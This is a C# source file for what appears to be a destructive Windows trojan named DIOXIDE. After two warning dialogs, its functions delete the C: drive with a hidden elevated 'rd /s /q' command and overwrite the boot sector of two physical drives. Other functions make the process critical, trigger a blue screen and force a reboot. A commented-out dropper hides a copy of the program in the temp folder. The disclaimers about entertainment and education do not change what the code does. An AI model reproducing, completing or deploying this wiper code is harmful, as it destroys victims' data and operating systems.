using System;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using static DIOXIDE.Functions;

namespace DIOXIDE
{
    class destruction
    {
        private static byte[] code1 = {

};

        private static uint STATUS_ASSERTION_FAILURE = 0xC0000350;

        public void WARNING()
        {
            if (MessageBox.Show( "WARNING!\n\nYou have ran a Trojan known as Dioxide.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", "Malware alert - DIOXIDE", MessageBoxButtons.YesNo, MessageBoxIcon.Warning ) == DialogResult.No)
            {
                Environment.Exit( 0 );
            }
            else
            {
                if (MessageBox.Show( "FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", "Malware alert - DIOXIDE", MessageBoxButtons.YesNo, MessageBoxIcon.Warning ) == DialogResult.No)
                {
                    Environment.Exit( 0 );
                }
            }
        }
        /*
        public static void ExecuteDropper()
        {
            string EXEpath = Application.ExecutablePath;

            StreamWriter sw = File.CreateText( TempPath + "Dioxide.txt" );
            sw.WriteLine( exePath );
            sw.Close();

            File.Copy( @EXEpath, TempPath + "Dioxide.exe", true );

            FileInfo fi = new FileInfo( TempPath + "Dioxide.exe" );
            fi.Attributes |= FileAttributes.Hidden;
            fi.Attributes |= FileAttributes.System;

            Sleep( 2000 );

            Process.Start( TempPath + "Dioxide.exe", "/run" );

            Sleep( 1000 );

            return;
        }
        public static void ExecuteDropper2()
        {
            string EXEpath = Application.ExecutablePath;

            StreamReader sr = new StreamReader( TempPath + "Dioxide.txt" );
            string path = sr.ReadToEnd();
            sr.Close();

            Sleep( 2000 );

            File.Delete( @path );

            File.Delete( TempPath + "Dioxide.txt" );

            // Sleep( 2000 );

            Process.Start( TempPath + "Dioxide.exe", "/D" );

            Sleep( 1000 );

            return;
        }
        */

        public void destructwindows()
        {
            ProcessStartInfo destructionwindows = new ProcessStartInfo();
            destructionwindows.FileName = "cmd.exe";
            destructionwindows.Arguments = @"cmd /c /rd /s /q C:\";
            destructionwindows.WindowStyle = ProcessWindowStyle.Hidden;
            destructionwindows.CreateNoWindow = true;
            destructionwindows.Verb = "RunAs";
            Process.Start( destructionwindows );
        }

        public void OverwriteBoot()
        {
            IntPtr hDrive;
            uint dwWrittenBytes;
            bool bSuccess;

            hDrive = Win32API.CreateFileW( "\\\\.\\PhysicalDrive0", Win32API.GENERIC_WRITE, Win32API.FILE_SHARE_READ | Win32API.FILE_SHARE_WRITE, IntPtr.Zero, Win32API.OPEN_EXISTING, 0, IntPtr.Zero );

            if (hDrive == Win32API.INVALID_HANDLE_VALUE)
            {

            }

            bSuccess = Win32API.WriteFile( hDrive, code1, 512, out dwWrittenBytes, IntPtr.Zero );

            if (!bSuccess)
            {
                Win32API.CloseHandle( hDrive );
            }

            Thread.Sleep( 50 );

            hDrive = Win32API.CreateFileW( "\\\\.\\PhysicalDrive1", Win32API.GENERIC_WRITE, Win32API.FILE_SHARE_READ | Win32API.FILE_SHARE_WRITE, IntPtr.Zero, Win32API.OPEN_EXISTING, 0, IntPtr.Zero );

            if (hDrive == Win32API.INVALID_HANDLE_VALUE)
            {

            }

            bSuccess = Win32API.WriteFile( hDrive, code1, 512, out dwWrittenBytes, IntPtr.Zero );

            if (!bSuccess)
            {
                Win32API.CloseHandle( hDrive );
            }
        }
        public void SetCriticalProcess()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            Win32API.NtSetInformationProcess( Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof( int ) );
        }
        public void BSOD()
        {
            Win32API.RtlAdjustPrivilege( 19, true, false, out bool previousValue );
            Win32API.NtRaiseHardError( STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response );
        }
        public void ForceRebootComputer()
        {
            Boolean bUnused;
            Win32API.RtlAdjustPrivilege( 19 /* SeShutdownPrivilege */, true, false, out bUnused );
            Win32API.NtSetSystemPowerState( 6, 6, 0x00010000 | 0x0000000a );
            Win32API.NtShutdownSystem( 1 );
            Win32API.ExitWindowsEx( 0x00000002, 0x00000004 );
        }
    }
}
